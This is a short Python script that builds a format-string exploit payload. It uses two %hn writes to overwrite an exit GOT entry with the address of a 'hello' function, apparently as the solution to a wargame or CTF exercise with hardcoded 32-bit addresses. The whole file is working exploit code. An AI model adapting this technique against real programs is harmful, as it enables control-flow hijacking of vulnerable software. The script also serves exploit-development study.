import struct

hello = 0x80484b4
exit_plt = 0x8049724
stack_offset = 4

lower_bytes = (hello & 0xffff) - 8
higher_bytes = ((hello & 0xffff0000) >> 16) - (lower_bytes + 8)
if higher_bytes < 0:
	higher_bytes = ((hello & 0xffff0000) >> 16) + 16**4 - lower_bytes - 8


def pad(s):
	return s + (512-len(s))*"X"


payload = ""
payload += struct.pack("<I", exit_plt)
payload += struct.pack("<I", exit_plt+2)
payload += "%" + str(lower_bytes) + "x%" + str(stack_offset) + "$hn"
payload += "%" + str(higher_bytes) + "x%" + str(stack_offset+1) + "$hn"


print(pad(payload))


